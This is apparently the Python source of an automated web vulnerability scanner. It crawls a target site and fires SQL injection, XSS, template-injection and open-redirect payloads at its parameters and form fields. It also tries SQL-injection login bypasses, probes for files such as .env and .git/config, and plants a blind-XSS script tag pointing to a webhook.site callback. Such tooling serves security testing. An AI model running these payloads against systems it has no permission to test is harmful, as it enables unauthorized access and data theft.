import time
import requests
import math
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, parse_qsl
from collections import deque
from playwright.sync_api import sync_playwright

# --- IMPORT KNOWLEDGE BASE ---
try:
    from vuln_kb import VULN_DB
except ImportError:
    VULN_DB = {}

# --- HELPER: Risk Calculation ---
def calculate_deep_risk(vuln_type, severity):
    cvss_map = {
        "SQL_INJECTION": 9.8, 
        "XSS_REFLECTED": 6.1, 
        "SSTI": 9.0,                
        "SHADOW_API": 7.5, 
        "SENSITIVE_FILE": 9.0, 
        "OPEN_REDIRECT": 6.1,       
        "MISSING_CSP": 4.3,
        "MISSING_HSTS": 3.1,
        "CLICKJACKING": 4.3,
        "SERVER_ERROR": 5.0,        
        "WEAK_SSL": 5.3,
        "BLIND_XSS": 9.0,           
        "BLIND_SSRF": 9.8           
    }
    
    score = cvss_map.get(vuln_type, 5.0)
    if severity == "Critical": score = max(score, 9.0)
    elif severity == "High": score = max(score, 7.5)
    
    base_asset_value = 1000 
    financial_impact = base_asset_value * math.exp(score / 2.5)
    return round(score, 1), round(financial_impact, 2)

def create_vuln(v_key, url, custom_details, severity="Medium"):
    kb_data = VULN_DB.get(v_key, {})
    title = kb_data.get("title", v_key)
    cvss, cost = calculate_deep_risk(v_key, severity)

    return {
        "type": title,              
        "url": url,
        "severity": severity,
        "description": kb_data.get("description", custom_details),
        "impact": kb_data.get("impact", "Check detailed logs for impact analysis."),
        "remediation": kb_data.get("remediation", "Please patch this issue immediately."),
        "fix": kb_data.get("code_fix", "No specific code patch available."),
        "reproduction": f"Automated Deep Scan found: {custom_details}",
        "cvss": cvss,
        "est_cost": cost
    }

# --- OAST HELPER FUNCTIONS ---
def generate_oast_token():
    try:
        print("[*] 🌐 Provisioning OAST listener via Webhook.site...")
        response = requests.post("https://webhook.site/token", timeout=10)
        if response.status_code in [200, 201]:
            token = response.json().get('uuid')
            print(f"[*] 🎯 OAST Listener established: webhook.site/{token}")
            return token
    except Exception as e:
        print(f"[!] Failed to provision OAST: {e}")
    return None

def check_oast_interactions(token):
    if not token:
        return False
        
    print(f"[*] 📡 Polling OAST server for token: {token}...")
    try:
        response = requests.get(f"https://webhook.site/token/{token}/requests", timeout=10)
        if response.status_code == 200:
            interactions = response.json().get('data', [])
            if len(interactions) > 0:
                print(f"[*] 🚨 OAST CALLBACK DETECTED! {len(interactions)} external interactions recorded.")
                return True
    except Exception as e:
        print(f"[!] OAST Polling Error: {e}")
    return False

# --- STANDARD BROWSER HEADERS ---
REQ_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# --- MODULE 1: Heavyweight Spider (Crawler) ---
def run_heavy_spider(start_url, context, max_pages=15):
    """
    Stateful Playwright crawler to map the attack surface (SPAs and static HTML).
    """
    print(f"[*] 🕸️ Initializing Heavyweight Spider on {start_url}...")
    target_domain = urlparse(start_url).netloc
    
    queue = deque([start_url])
    visited = set([start_url])
    discovered_endpoints = set([start_url]) 
    
    page = context.new_page()
    
    while queue and len(visited) <= max_pages:
        current_url = queue.popleft()
        print(f"  -> [Crawling] {current_url}")
        
        try:
            page.goto(current_url, timeout=15000)
            try:
                page.wait_for_load_state("networkidle", timeout=5000)
            except: pass
            
            # Extract links
            hrefs = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a')).map(a => a.href);
            }""")
            
            for href in hrefs:
                if not href: continue
                parsed_href = urlparse(href)
                
                # Strip 'www.' from both to ensure they match even if the site redirects
                clean_target = target_domain.replace("www.", "")
                clean_href_domain = parsed_href.netloc.replace("www.", "")

                if clean_target in clean_href_domain and href.startswith('http'):
                    clean_url = href.split('#')[0]
                    if clean_url not in visited:
                        visited.add(clean_url)
                        queue.append(clean_url)
                        discovered_endpoints.add(clean_url)
            
            # Extract forms
            actions = page.evaluate("""() => {
                return Array.from(document.querySelectorAll('form')).map(f => f.action);
            }""")
            
            for action in actions:
                if action:
                    full_action_url = urljoin(current_url, action)
                    if urlparse(full_action_url).netloc == target_domain:
                        discovered_endpoints.add(full_action_url)
                        
        except Exception as e:
            print(f"  [!] Crawler skipped {current_url}: Timeout or Navigation error.")
            continue
            
    page.close()
    print(f"[*] 🗺️ Spider Mapping Complete. Identified {len(discovered_endpoints)} attack vectors.")
    return list(discovered_endpoints)

# --- MODULE 2: Header & SSL Analysis ---
def scan_headers_and_ssl(target_url):
    findings = []
    try:
        res = requests.get(target_url, headers=REQ_HEADERS, timeout=8)
        headers = {k.lower(): v for k, v in res.headers.items()}
        
        if 'content-security-policy' not in headers:
            findings.append(create_vuln("MISSING_CSP", target_url, "Content-Security-Policy header is missing.", "Medium"))
        if 'strict-transport-security' not in headers and target_url.startswith("https"):
            findings.append(create_vuln("MISSING_HSTS", target_url, "HSTS header is missing.", "Low"))
        if 'x-frame-options' not in headers:
            findings.append(create_vuln("CLICKJACKING", target_url, "X-Frame-Options header is missing.", "Low"))
        if 'server' in headers:
            findings.append(create_vuln("SERVER_ERROR", target_url, f"Server header exposes technology: {headers['server']}", "Low"))
    except Exception as e:
        pass # Silently pass to avoid terminal clutter on massive crawls
    return findings

# --- MODULE 3: Sensitive File Fuzzer ---
def scan_sensitive_files(target_url):
    findings = []
    files = [
        ".env", ".git/config", "backup.sql", "database.sql", 
        "phpinfo.php", ".DS_Store", "web.config", "server.js"
    ]
    
    # Only fuzz files on the root directory to save time and prevent redundant checks
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
    
    if target_url != base_url:
        return findings

    print(f"[*] 📂 Fuzzing sensitive files on {base_url}...")
    for filename in files:
        full_url = urljoin(base_url, filename)
        try:
            res = requests.get(full_url, headers=REQ_HEADERS, timeout=4, allow_redirects=False)
            if res.status_code == 200 and len(res.content) > 10:
                if "404" not in res.text.lower() and "<html" not in res.text.lower():
                    findings.append(create_vuln("SENSITIVE_FILE", full_url, f"Accessible sensitive file found: {filename}", "Critical"))
        except: pass
    return findings

# --- MODULE 4: Fast URL Parameter Fuzzer (NEW UPGRADED SQLi ENGINE) ---
def scan_url_parameters(target_url):
    alerts = []
    parsed_url = urlparse(target_url)
    params = parse_qsl(parsed_url.query)
    
    if not params: return alerts
        
    print(f"[*] 🧬 Fuzzing URL parameters with multi-engine payloads on {target_url}...")
    
    payloads = [
        {"type": "SQL_INJECTION", "payload": "' OR '1'='1", "check": "500"}, 
        {"type": "SQL_INJECTION", "payload": "%27%20OR%20SLEEP%285%29--", "time_delay": 5}, 
        {"type": "SQL_INJECTION", "payload": "'; WAITFOR DELAY '0:0:5'--", "time_delay": 5}, 
        {"type": "SQL_INJECTION", "payload": "' || pg_sleep(5)--", "time_delay": 5}, 
        {"type": "SSTI", "payload": "{{7*7}}", "check": "49"}
    ]
    
    baseline_time = 0
    try:
        start = time.time()
        requests.get(target_url, headers=REQ_HEADERS, timeout=10)
        baseline_time = time.time() - start
    except: baseline_time = 1
    
    for key, value in params:
        for attack in payloads:
            fuzzed_params = params.copy()
            fuzzed_params[fuzzed_params.index((key, value))] = (key, value + attack["payload"])
            fuzzed_url = urlunparse(parsed_url._replace(query=urlencode(fuzzed_params)))
            
            try:
                start_time = time.time()
                res = requests.get(fuzzed_url, headers=REQ_HEADERS, timeout=12) 
                elapsed = time.time() - start_time
                
                # Check Time-Based SQLi
                if "time_delay" in attack and elapsed > (baseline_time + 4.5):
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, f"CONFIRMED TIME-BASED SQLi: Engine sleep triggered for {elapsed:.2f}s.", "Critical"))
                    continue
                
                # Check 500 Errors
                if res.status_code == 500 and attack["type"] == "SQL_INJECTION":
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, "SUSPECTED SQLi: Payload crashed the database query (HTTP 500).", "High"))
                
                # Check Reflected Execution
                if "check" in attack and attack["check"] in res.text and attack["check"] != "500":
                    alerts.append(create_vuln(attack["type"], fuzzed_url, "Payload execution confirmed in response.", "Critical"))
            except requests.exceptions.Timeout:
                if "time_delay" in attack:
                    alerts.append(create_vuln("SQL_INJECTION", fuzzed_url, "CONFIRMED TIME-BASED SQLi: Server timed out processing sleep command.", "Critical"))

    return alerts

# --- MODULE 5: Active Playwright Scanner ---
def scan_active_playwright(target_url, context, oast_domain):
    alerts = []
    
    sql_errors = [
        "check the manual that corresponds to your mysql",
        "unrecognized token:", "syntax error at or near",
        "sqlite_error", "ora-00933", "postgresql query failed",
        "unterminated quoted string", "you have an error in your sql syntax",
        "quoted string not properly terminated", "invalid input syntax for type",
        "java.sql.sqlexception", "internal error has occurred", "odbc microsoft access driver",
        "mysql_fetch_array()"
    ]

    payloads = [
        {"key": "SQL_INJECTION", "payload": "' OR '1'='1", "check": sql_errors},
        {"key": "SQL_INJECTION", "payload": "' OR 1=1 -- ", "check": sql_errors},
        {"key": "SQL_INJECTION", "payload": "admin' -- ", "check": sql_errors},
        {"key": "SQL_INJECTION", "payload": "' OR 1=1#", "check": sql_errors},
        {"key": "XSS_REFLECTED", "payload": "\"><script>alert('SENTINEL')</script>", "check": []},
        {"key": "XSS_REFLECTED", "payload": "\"><svg/onload=alert('SENTINEL')>", "check": []},
        {"key": "XSS_REFLECTED", "payload": "<script>alert('SENTINEL')</script>", "check": []},
        {"key": "SSTI", "payload": "{{7*7}}", "check": ["49"]},
        {"key": "OPEN_REDIRECT", "payload": "http://google.com", "check": []},
        {"key": "BLIND_XSS", "payload": f"\"><script src='https://{oast_domain}'></script>", "check": []},
        {"key": "BLIND_SSRF", "payload": f"https://{oast_domain}", "check": []}
    ]

    page = context.new_page()
    
    # 1. Global XSS Event Listener (Catches all alerts from DOM or URL fuzzing)
    def handle_dialog(dialog):
        if "SENTINEL" in dialog.message:
            alerts.append(create_vuln("XSS_REFLECTED", page.url, f"CONFIRMED: XSS payload executed. Alert: '{dialog.message}'", "High"))
        try: dialog.dismiss()
        except: pass
    
    page.on("dialog", handle_dialog)
    
    try:
        page.goto(target_url, timeout=30000)
        try: page.wait_for_load_state("networkidle", timeout=5000)
        except: pass

        for selector in ["button[aria-label='Close Welcome Banner']", "a[aria-label='dismiss cookie message']"]:
            try: page.locator(selector).click(timeout=1000)
            except: pass

        # --- DEDICATED AUTH BYPASS ENGINE ---
        password_inputs = page.locator("input[type='password']")
        if password_inputs.count() > 0:
            print(f"[*] 🕵️ Login form detected on {target_url}. Engaging Auth Bypass fuzzing...")
            for attack in [p for p in payloads if p["key"] == "SQL_INJECTION"]:
                try:
                    page.goto(target_url, timeout=30000, wait_until="domcontentloaded")
                    pass_field = page.locator("input[type='password']").first
                    login_form = pass_field.locator("xpath=ancestor::form").first
                    
                    if login_form.count() > 0:
                        user_field = login_form.locator("input[type='text'], input[type='email'], input:not([type='hidden']):not([type='password']):not([type='submit'])").first
                        submit_btn = login_form.locator("button[type='submit'], input[type='submit'], input[type='image']").first
                    else:
                        user_field = page.locator("input[name*='user'], input[name*='uid'], input[name='uname'], input[type='text']").first
                        submit_btn = page.locator("button[type='submit'], input[type='submit']").first
                    
                    if user_field.is_visible() and pass_field.is_visible():
                        user_field.fill("")
                        user_field.fill(attack["payload"])
                        pass_field.fill("")
                        pass_field.fill(attack["payload"]) 
                        
                        if submit_btn.is_visible():
                            submit_btn.click()
                        else:
                            pass_field.press("Enter")
                            
                        page.wait_for_timeout(3000) 
                        content = page.content().lower()
                        current_url = page.url.lower()
                        
                        if "bank/main" in current_url or "dashboard" in current_url or "userinfo.php" in current_url or "sign off" in content or "welcome" in content or "logout" in content or (current_url != target_url.lower() and "login" not in current_url and "error" not in current_url):
                            alerts.append(create_vuln("SQL_INJECTION", target_url, f"CRITICAL AUTH BYPASS: Payload {attack['payload']} successfully bypassed the login gate!", "Critical"))
                            break 
                except Exception:
                    continue
            page.goto(target_url, timeout=30000, wait_until="networkidle")

        # --- STANDARD INPUT FUZZING (DOM) ---
        input_count = page.locator("input[type='text'], input[type='search'], input[type='password'], textarea").count()
        
        if input_count > 0:
            for i in range(input_count):
                for attack in payloads:
                    try:
                        page.goto(target_url, timeout=30000, wait_until="domcontentloaded")
                        current_input = page.locator("input[type='text'], input[type='search'], input[type='password'], textarea").nth(i)
                        
                        if current_input.is_visible():
                            current_input.fill("")
                            current_input.fill(attack["payload"])
                            current_input.press("Enter")
                            
                            page.wait_for_timeout(2500)
                                
                            if attack["key"] in ["SQL_INJECTION", "SSTI"]:
                                content = page.content().lower()
                                if any(x in content for x in attack["check"]):
                                    alerts.append(create_vuln(attack["key"], target_url, f"Payload {attack['payload']} caused a Database Syntax Error.", "Critical"))
                                    
                            elif attack["key"] == "OPEN_REDIRECT":
                                parsed_url = urlparse(page.url)
                                if "google.com" in parsed_url.netloc:
                                    alerts.append(create_vuln("OPEN_REDIRECT", target_url, "Input successfully redirected user to external site (google.com).", "Medium"))
                    except Exception:
                        continue
    except Exception as e:
        print(f"[!] Browser Interaction Error on {target_url}: {e}")
    finally:
        page.close() 
        
    return alerts

# --- ORCHESTRATOR ---
def run_deep_scan(target_url, user_id=None, auth_config=None):
    print(f"[*] 🚀 Starting Deep Scan Orchestrator on {target_url}")
    report = {
        "target": target_url,
        "vulnerabilities": [],
        "summary": {"high": 0, "medium": 0, "low": 0},
        "financial_risk_total": 0
    }

    # Generate OAST Token once for the entire session
    oast_token = generate_oast_token()
    oast_domain = f"webhook.site/{oast_token}" if oast_token else "webhook.site/fallback-test-123"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, slow_mo=50)
            context = browser.new_context(ignore_https_errors=True, user_agent=REQ_HEADERS["User-Agent"])
            
            # --- 1. AUTHENTICATION PHASE ---
            if auth_config and auth_config.get('type') == 'form':
                try:
                    print("[*] 🧠 Engaging Heuristic Auto-Login Engine...")
                    login_page = context.new_page()
                    login_page.goto(auth_config.get('login_url'), timeout=30000)
                    login_page.wait_for_load_state("networkidle", timeout=15000)
                    
                    pass_input = login_page.locator('input[type="password"]').first
                    user_input = login_page.locator('input[type="email"], input[name*="user"], input[name*="email"], input[id*="user"], input[type="text"]').first
                    
                    if pass_input.count() > 0 and user_input.count() > 0:
                        user_input.fill(auth_config.get('username'))
                        pass_input.fill(auth_config.get('password'))
                        submit_button = login_page.locator("button[type='submit'], input[type='submit']").first
                        if submit_button.count() > 0: submit_button.click()
                        else: pass_input.press("Enter")
                        login_page.wait_for_load_state("networkidle", timeout=15000)
                    login_page.close()
                except Exception as e:
                    print(f"[!] Authentication Engine Failed: {e}")

            # --- 2. RECONNAISSANCE PHASE (The Spider) ---
            endpoints_to_attack = run_heavy_spider(target_url, context, max_pages=15)
            
            # --- 3. EXPLOITATION PHASE ---
            for endpoint in endpoints_to_attack:
                print(f"[*] ⚔️  Attacking endpoint: {endpoint}")
                report["vulnerabilities"].extend(scan_headers_and_ssl(endpoint))
                report["vulnerabilities"].extend(scan_sensitive_files(endpoint))
                
                # --- NEW INTEGRATION: Upgraded SQLi engine applied to discovered endpoints ---
                report["vulnerabilities"].extend(scan_url_parameters(endpoint)) 
                
                report["vulnerabilities"].extend(scan_active_playwright(endpoint, context, oast_domain))

            # --- 4. ASYNCHRONOUS VALIDATION PHASE ---
            print("[*] ⏳ Waiting 5 seconds for asynchronous OAST callbacks...")
            time.sleep(5)
            if check_oast_interactions(oast_token):
                report["vulnerabilities"].append(create_vuln("BLIND_XSS", target_url, f"CONFIRMED OAST INTERACTION: Payload pinged {oast_domain}.", "Critical"))
                
            browser.close()
            
    except Exception as e:
        print(f"[!] Deep Scan Critical Engine Failure: {e}")

    # Deduplicate findings across all mapped pages
    unique_vulns = []
    seen = set()
    for v in report["vulnerabilities"]:
        if v:
            vuln_signature = (v.get('type'), v.get('url'))
            if vuln_signature not in seen:
                seen.add(vuln_signature)
                unique_vulns.append(v)
            
    report["vulnerabilities"] = unique_vulns

    # Calculate summary metrics
    for v in report["vulnerabilities"]:
        report["financial_risk_total"] += v.get("est_cost", 0)
        sev = v.get("severity", "Low")
        if sev in ["Critical", "High"]: report["summary"]["high"] += 1
        elif sev == "Medium": report["summary"]["medium"] += 1
        else: report["summary"]["low"] += 1

    print(f"[*] Deep Scan Complete. Total Issues: {len(report['vulnerabilities'])}")
    return report